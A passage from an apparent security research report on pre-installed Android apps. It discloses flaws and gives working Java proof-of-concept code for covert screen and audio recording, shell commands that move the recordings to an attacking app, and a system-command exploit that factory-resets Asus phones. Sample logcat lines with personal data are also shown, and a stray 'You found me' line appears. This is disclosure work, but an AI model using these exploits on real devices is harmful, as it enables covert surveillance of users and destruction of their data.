device 
is 
DOOGEE/full_hct6580_weg_c_m/hct6580_weg_c_m:6.0/MRA58K/1503503147:user/test-keys. This 
app has a package name of com.hct.screenrecord (versionCode=1, versionName=1.0). When the 
screen recording occurs, it is not transparent to the user. A visible effect on the screen is a blinking red 
circle. There is also a notification indicating that the screen is being recorded, although the notification is 
does not allow the user to stop the recording if clicked. The screen recording will stop when the screen goes 
off or when the user clicks the red circle. The mp4 file will be written to external storage to a base path of 
/sdcard/ScreenRecord. A third-party app can initiate the screen recording with the following source 
code. 
Intent i = new Intent(); 
i.setClassName("com.hct.screenrecord", "com.hct.screenrecord.ScreenRecordService"); 
startService(i); 
16. Oppo F5 – Audio Record the User 
This vulnerability allows any app co-located on the device to record audio of the user and their surroundings. 
To exploit this vulnerability, the command execution as the system user (see Section 4.5), must also be 
used to transfer the file due to its restrictive file permissions. The Oppo F5 device we examined had a build 
fingerprint of OPPO/CPH1723/CPH1723:7.1.1/N6F26Q/1513597833:user/release-keys. The Oppo F5 
Android device comes a pre-installed app with a package name of com.oppo.engineermode app 
(versionCode=25, versionName=V1.01). The com.oppo.engineermode.autoaging.MicTest activity 
application component within the com.oppo.engineermode app will start recording audio and write it to a 
file in the /data directory when it is started (e.g., /data/2018-05-03_04.42.37.amr). When this activity 
is started by an external app, the external app can wait 600 milliseconds and then send an intent to return to 
the home screen. This will start the audio recording and the app will not be visible in the recent apps due to 
starting the activity with the Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS flag. So, the user may see 
an activity pop up and close quickly, although they will not be able to view the activity from the recent apps 
and would likely be unaware that the audio recording is occurring. The source code is provided below. 
Intent i = new Intent("com.oppo.engineermode.autoaging.MicTest"); 
i.setClassName("com.oppo.engineermode", "com.oppo.engineermode.autoaging.MicTest"); 
i.setFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS); 
this.startActivity(i); 
try { 
    Thread.sleep(600); 
} catch (InterruptedException e) { 
    e.printStackTrace(); 
} 
Intent i2 = new Intent("android.intent.action.MAIN"); 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
i2.addCategory(Intent.CATEGORY_HOME); 
startActivity(i2); 
The MicTest activity component will keep recording as long as the activity is alive. The user will not be 
able to view the activity through the recent apps list to close it. While the audio recording is ongoing, there 
is no indication to the user such as a notification, toast message, etc. As the audio file is recoding, it can be 
copied to another location, and the copied file will still be playable. The attacking app does not require any 
permissions to obtain the audio recording file (an amr file), although the app will need the INTERNET 
permission if the audio file is to be sent to a remote server. Once the attacking app wants the recording file, 
it needs to determine the file name of the audio file. This can be accomplished by using the 
com.dropboxchmod app to list the files in the /data directory. Using the approach in Section 4.1.2, the 
attacking app can transfer one or all amr files to the attacking apps private directory by leveraging the 
com.dropboxchmod app that allows arbitrary command execution as the system user. SELinux on the Oppo 
F5 device does not prevent the system user from writing to a third-party app’s private directory. The same 
behavior is not present on the Asus ZenFone V Live device, although it is present on the Asus ZenFone 3 
device. The SELinux rules dictate the capability of a platform app directly writing to a third-party app’ 
private directory. Prior to making the com.dropboxchmod app write any files to its internal directory, it will 
need to make its private app directory (e.g., /data/data/some.attacking.app) both writable and 
executable. Below are the commands the attacking app can have the com.dropboxchmod app to transfer the 
audio recording file to is private app directory using the approach detailed in Section 4.5. 
cp /data/2018-05-03_04.42.37.amr /data/data/the.attacking.app 
chmod 777 /data/data/the.attacking.app/2018-05-03_04.42.37.amr 
At this point the 2018-05-03_04.42.37.amr file is readable by the attacking app and can be sent to a 
remote location.  
Conclusion 
Pre-installed apps present a potent attack vector due to their access to privileged permissions, potential 
widespread presence, and the fact that the user may not be able to disable or remove them. Vulnerable 
pre-installed apps can present a tangible threat to end-users since certain apps can contain exposed 
interfaces that will leak PII to locations accessible by other apps on the device. Furthermore, certain 
vulnerabilities facilitate surveillance by allowing the recording of audio, video, and the user’s keystrokes. 
As we have shown in this document, even devices sold by US carriers can contain severe vulnerabilities. 
We argue that more effort should be invested in scanning for vulnerabilities and threats that are present on 
a device as soon as the user first removes it from the box and powers it on.  
Acknowledgements 
This work was supported by the Department of Homeland Security (DHS) Science and Technology 
(S&T) Directorate via award to the Critical Infrastructure Resilience Institute (CIRI) Center of Excellence 
(COE) led by the University of Illinois at Urbana-Champaign (UIUC). The views and conclusions 
contained herein are those of the authors and should not be interpreted as necessarily representing the 
official policies or endorsements, either expressed or implied, of DHS. 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
We would like to thank Vincent Sritapan from DHS S&T. We would also like to thank Dr. Michael 
Bailey, Joshua Reynolds, Dr. Joshua Mason, and Deepak Kumar from UIUC for their help in 
downloading and testing apps and technical discussions. A big thank you to Dr. Mohamed Elsabagh for 
technical advice.  
Appendix A. PoC code for Arbitrary Command Execution as the system user on the Verizon Asus 
ZenFone V Live Device. The Same Code Also Works on the Asus ZenFone 3 Max Device. 
public void asus_zenfone_V_live_command_execution_as_system_user() { 
    Intent i = new Intent(); 
    i.setClassName("com.asus.splendidcommandagent", 
"com.asus.splendidcommandagent.SplendidCommandAgentService"); 
    SplendidServiceConnection servConn = new SplendidServiceConnection(); 
    boolean ret = bindService(i, servConn, BIND_AUTO_CREATE); 
    Log.d(TAG, "initService() bound with " + ret); 
} 
class SplendidServiceConnection implements ServiceConnection { 
    @Override 
    public void onServiceConnected(ComponentName name, IBinder boundService) { 
        Log.w(TAG, "serviceConnected"); 
        Parcel send = Parcel.obtain(); 
        Parcel reply = Parcel.obtain(); 
send.writeInterfaceToken("com.asus.splendidcommandagent.ISplendidCommandAgentService"); 
        String command = "am broadcast -a android.intent.action.MASTER_CLEAR"; 
        send.writeString(command); 
        try { 
            boolean success = boundService.transact(1, send, reply, Binder.FLAG_ONEWAY); 
            Log.i(TAG, "binder transaction success=" + success); 
        } catch (RemoteException e) { 
            e.printStackTrace(); 
        } 
        send.recycle(); 
        reply.recycle(); 
    } 
    @Override 
    public void onServiceDisconnected(ComponentName arg0) { 
        Log.w(TAG, "onServiceConnected"); 
    } 
} 
Appendix B. User and Device Data Appearing the in the Logcat Log. 
Below are concrete instances of user and device data appearing in the logcat log. This is not an exhaustive 
listing of items that can appear in the logcat log, but just a sampling. We have modified the values below 
from their actual values to contrived values to protect our privacy.  
Device GPS Coordinates 
03-15 15:19:25.899  1394  1453 D LocationManagerService: incoming location: Location[gps 39.842631,-
78.310564 acc=52 et=+13m58s695ms alt=130.95172119140625 vel=0.0 {Bundle[{satellites=11}]}] 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
03-16 15:56:31.805 17382 17382 I GeofencerStateMachine: sendTransitions: location=Location[fused 
39.842631,-78.310564 acc=70 et=+1h0m16s339ms alt=157.0609130859375 vel=0.0 
{Bundle[mParcelledData.dataSize=528]}] 
03-16 15:56:27.785  3036  3555 V GnssLocationProvider: reportLocation lat: 39.842631 long: -78.310564 
timestamp: 1521230188000 
User’s Gmail Account 
03-15 15:12:45.499  1394  1453 E SyncManager: Couldn't find backoff values for 
PI:EMAIL/com.google.android.keep:u0 
03-16 15:15:35.375 16847 16847 I Finsky  : g: " PI:EMAIL" 
03-16 15:55:42.675   482   659 I S3UtteranceSender: send account: %s, modelType: %d[notmyrealaccount 
@gmail.com, OK_GOOGLE] 
Device Phone Number 
03-16 15:38:17.225  3587  3587 D VendorGsmCdmaPhone: getLine1Number isimrecord return mdn = 5403334444 
03-16 15:38:20.005  3587  3587 D VendorGsmCdmaPhone: getLine1Number impu[1]=sip:+PI:EMAIL 
03-16 15:38:20.005  3587  3587 D VendorGsmCdmaPhone: getLine1Number impu[2]=tel:+15403334444 
Device Serial Number 
03-16 17:17:15.315  4171  4171 I zdmc    : Hwv:  320983924782 
03-16 17:15:42.038   333   333 E wcnss_service: Serial Number is  83924782 
ICCID 
03-16 17:16:14.715  3605  3605 D SelfactivationUtil:   Iccid get ready + iccid = 89148000004026293327 
IMSI 
03-16 17:17:15.315  4171  4171 I zdmc    : IMSI: 311480407548581 
JavaScript Debug Messages Showing Websites Visited 
03-16 15:58:51.425   677   677 I chromium: [INFO:CONSOLE(320)] "[GPT DEBUG] googletag.display(adoop)", 
source: http://www.sherdog.com/ (320)  
03-16 15:58:45.925   677   677 I chromium: [INFO:CONSOLE(0)] "The SSL certificate used to load resources 
from https://c.amazon-adsystem.com will be distrusted in M70. Once distrusted, users will be prevented 
from loading these resources. See https://g.co/chrome/symantecpkicerts for more information.", source: 
https://www.reddit.com/ (0) 
Destination Number of Sent Text Messages 
03-16 16:27:38.935  8713  8906 D SmsManager: sendMultipartTextMessage's ScAddress is7038889999 
03-16 16:27:38.935  8713  8906 D SmsManager: sendTextMessage's ScAddress is7038889999 
Phone Numbers for Outgoing Calls 
03-16 16:28:47.825  9194  9194 D Telecom : UserCallIntentProcessor: ray isOtaspCallFromActivation:false 
number: 5409759176: UCA.oC@AAA 
03-16 16:28:48.085  9194  9194 D Telecom : UserCallIntentProcessor: isInternationalNumber, num:Country 
Code: 1 National Number: 5409759176: UCA.oC@AAA 
Phone Numbers for Incoming Calls 
03-16 16:39:20.315  3876  3876 V SDM     : onCallStateChanged() incomingNumber= +15409759176; callState= 1 
HTTPS Querystring 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
03-16 15:38:35.125  8475  8486 I ZteDownloadManager: DownloadProvider.insert --> original values = 
allow_roaming=true destination=4 
hint=file:///storage/emulated/0/Android/data/com.android.vending/files/1521229115002 otheruid=1000 
title=Verizon Messages notificationclass=com.google.android.finsky.download.DownloadBroadcastReceiver 
is_public_api=true visibility=0 notificationpackage=com.android.vending 
uri=https://play.googleapis.com/download/by-token/download?token=AOTCm0S_HplSz_C4dcG-
d7pY8dxOPdaPFHW4Wh1p_WXkrpu9QLwMhWWcmHcOg00aeyVHK7RxpddJJvhrjFNgo2jy4nx0lZoOCLOHD59w54dVGOETE_re2Lp53ASl3M
6ZXeGZnfn1IpgMlRuYG0wDq70FPeZYCEVp7PeJLqFUr7vF1vlCz_RMR3KpqVxp3aGvcpsNqsLJo_2uBJu1b0bYcRQBQ5Ky2wMlln567OUN
2NNb8NXk1nUOHTV5pMAw5Y7QxOpyNXA1QPd3UW-
ohYrbgK9SSUPsbaBNrBKGN8LUjcm_K_HS21rQf33imc1TLlvljCxyFEnW3NxABMu3ezNhDKunLjke_01fMEVnKVA9-
Qbpp0w&cpn=kiHfgI33chp7gskT allowed_network_types=2, callingPackage: com.android.vending 
MAC Address 
03-16 16:37:59.385   326   326 D QCNEA   : p2p_device_address=b2:c1:9e:8f:f5:ce 
Apps Installed 
03-16 16:43:55.025  8798  8798 D Launcher.Model: onReceive intent=Intent { 
act=android.intent.action.PACKAGE_ADDED dat=package:jackpal.androidterm flg=0x4000010 (has extras) } 
Apps Started From the Launcher 
03-16 17:07:59.835  3036 14466 I ActivityManager: START u0 {act=android.intent.action.MAIN 
cat=[android.intent.category.LAUNCHER] flg=0x10200000 cmp=air.com.bitrhymes.bingo/.AppEntry (has extras)} 
from uid 10028 on display 0 
Downloaded Files 
03-16 15:59:53.695  8475  8486 I ZteDownloadManager: DownloadProvider.insert --> original values = 
allow_roaming=true destination=6 flags=0 allow_write=0 is_visible_in_downloads_ui=true 
http_header_0=Referer: https://scholar.google.com/ mimetype=application/pdf scanned=0 allow_metered=true 
description=10.1.1.687.360.pdf title=10.1.1.687.360.pdf 
_data=/storage/emulated/0/Download/10.1.1.687.360.pdf status=200 total_bytes=311162 is_public_api=true 
visibility=2 uri=http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.687.360&rep=rep1&type=pdf 
notificationpackage=null allowed_network_types=-1, callingPackage: com.android.chrome 
SSID 
03-16 17:11:59.255   326   326 D QCNEA   : |CORE:CAS|             ssid: BQ_net_994 
03-16 17:12:07.405   326   326 D QCNEA   : ssid= BQ_net_994 
Arbitrary Messages from Installed Apps (password from a US Fortune 500 bank app) 
03-16 18:14:20.995 21817 21913 D CEOMAsyncTask: SignOn requestData @@params [COMPANY=companyID, 
WFUID=userID, PASSWORD=password, deviceId=a2e608f6bd79c78b, AUTHTYPE=1, token=, ceomNonce, 
mintSessionId=5ad3a148-d9f7-4431-a03b-1ecb6ca4ff7a, iatxnid=bbf6ca2f-e5f5-41f9-b225-48f1df1d1c7b, 
action=signon, 
iapayload=ewogICAiZW5jcnlwdGVkQm9keSI6ICJhS0hzSkpWRmx4eU5UNkN1dWhxU0JBaEliR09PQWZIRGZ2RDEzcnJBQ0gvQU1QY29U
OWtCYVpDcDZrb2U2WUtDN0RzenlMeHA2NkNLN013L2dqYlltR3JUOWQ5VHhJaC96L09BRkZKZDRBdXVYT1lJM3AzaUNGSGQ3bWVyc0hTME
hvdGZEc2xGbldzbEdxNGpZK3FJcndKOGx5UkFxRDlObkZKMmVRWnpKais0blVPTnR2SVliMDNlUUxTRTFUdk9wdGRncmVqekh4cWhJeFFj
TVZITVh4bWxyTEVIMXE4WkxlL3d6Mzh3R3NrTFhjL3Z3VEJuS244K1VIY1ZqdzZBcmd1Rk40RzFoYUpHNVBNclB3ZTBnTks3MmJBZ0J2OW
RiTDFEVmt2aU9vSzIvOUVUWlI1S1hpclpMcGxpdHNRVXY5MTAwbzRjaC9salRDcVBldExTNlpVZW9VSW0zWFZLOElHOXZrMkV0Z3pTcXgx
SUlwMWhQVS9QVFE0U2cyUllaU3FERFlNT0dQalFSbjRBWDRCL2orRXBFRmdQYmZVbDMrTE1lbHh4M211UVdJK3k5TFIvUTB3bEZaSnFLc0
lzSkgwUXA3ZmpJVGxwSU1mLzNaQUx5OXQzRkU3bzlKeW1heGhoZVQvUW8zTEl6WTNqSUNha 
Appendix C. The Text of Notifications (shown in red) Appearing in the dumpstate.txt file on the 
Asus ZenFone 3 Max Device. 
      Panels:  
        mNotificationPanel=com.android.systemui.statusbar.phone.NotificationPanelView{b3e63a8 I.E...... 
......ID 0,0-720,48 #7f14031f app:id/notification_panel} params=FrameLayout.LayoutParams={ width=match-
parent, height=match-parent, leftMargin=0, rightMargin=0, topMargin=0, bottomMargin=0 } 
          [PanelView(NotificationPanelView): expandedHeight=0.000000 maxPanelHeight=48 closing=f 
tracking=f justPeeked=f peekAnim=null timeAnim=null touchDisabled=f] 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
      active notifications: 4 
        [0] key=0|com.android.settings|1|null|1000 icon=StatusBarIconView(slot=com.android.settings/0x1 
icon=StatusBarIcon(icon=Icon(typ=RESOURCE pkg=com.android.settings id=0x7f02007f) visible user=0 ) 
notification=Notification(pri=0 contentView=null vibrate=null sound=null defaults=0x0 flags=0x0 
color=0x00000000 vis=PRIVATE)) 
            pkg=com.android.settings id=1 importance=2 
            notification=Notification(pri=0 contentView=null vibrate=null sound=null defaults=0x0 
flags=0x0 color=0x00000000 vis=PRIVATE) 
            tickerText="null" 
        [1] key=-1|android|17040405|null|1000 icon=StatusBarIconView(slot=android/0x1040415 
icon=StatusBarIcon(icon=Icon(typ=RESOURCE pkg=android id=0x010807b4) visible user=-1 ) 
notification=Notification(pri=0 contentView=null vibrate=null sound=null tick defaults=0x0 flags=0x2 
color=0xff607d8b vis=PUBLIC)) 
            pkg=android id=17040405 importance=2 
            notification=Notification(pri=0 contentView=null vibrate=null sound=null tick defaults=0x0 
flags=0x2 color=0xff607d8b vis=PUBLIC) 
            tickerText="USB debugging connected" 
        [2] key=0|com.android.vending|874755343|null|10041 
icon=StatusBarIconView(slot=com.android.vending/0x3423b50f icon=StatusBarIcon(icon=Icon(typ=RESOURCE 
pkg=com.android.vending id=0x7f0802da) visible user=0 ) notification=Notification(pri=-1 contentView=null 
vibrate=null sound=null tick defaults=0x0 flags=0x110 color=0xff0f9d58 category=status vis=PRIVATE)) 
            pkg=com.android.vending id=874755343 importance=2 
            notification=Notification(pri=-1 contentView=null vibrate=null sound=null tick defaults=0x0 
flags=0x110 color=0xff0f9d58 category=status vis=PRIVATE) 
            tickerText="Successfully updated "Android Messages"" 
        [3] key=-1|android|17040400|null|1000 icon=StatusBarIconView(slot=android/0x1040410 
icon=StatusBarIcon(icon=Icon(typ=RESOURCE pkg=android id=0x010807b4) visible user=-1 ) 
notification=Notification(pri=-2 contentView=null vibrate=null sound=null tick defaults=0x0 flags=0x2 
color=0xff607d8b vis=PUBLIC)) 
            pkg=android id=17040400 importance=1 
            notification=Notification(pri=-2 contentView=null vibrate=null sound=null tick defaults=0x0 
flags=0x2 color=0xff607d8b vis=PUBLIC) 
            tickerText="USB for file transfer" 
You found me  
Appendix D. The output of querying the com.rcs.gsma.na.provider.message authority of the 
com.rcs.gsma.na.provider.message.MessageProvider class.  
_id:10 thread_id:4 address:(703) 671-7890 person:null date:1520018133117 date_sent:0 
protocol:null read:1 status:-1 type:2 reply_path_present:null subject:null body:Heyyy 
service_center:null locked:0 sub_id:1 error_code:0 creator:com.android.mms seen:1 priority:-1 
phone_id:-1 rcs_message_id:null rcs_file_name:null rcs_mime_type:null rcs_msg_type:-1 
rcs_msg_state:null rcs_conversation_id:null rcs_contribution_id:null rcs_file_selector:null 
rcs_file_transfered:null rcs_file_transfer_id:null rcs_file_size:0 rcs_thumb_path:null 
rcs_read_status:|| rcs_file_icon:null rcs_extra_type:null rcs_file_record:null 
rcs_chat_type:null rcs_disposition_type:null rcs_extend_body:null rcs_file_status:null 
rcs_thumb_status:null 
 _id:9 thread_id:4 address:(703) 671-7890 person:null date:1520013100751 date_sent:0 
protocol:null read:1 status:-1 type:2 reply_path_present:null subject:null body: Gen 
service_center:null locked:0 sub_id:1 error_code:0 creator:com.android.mms seen:1 priority:-1 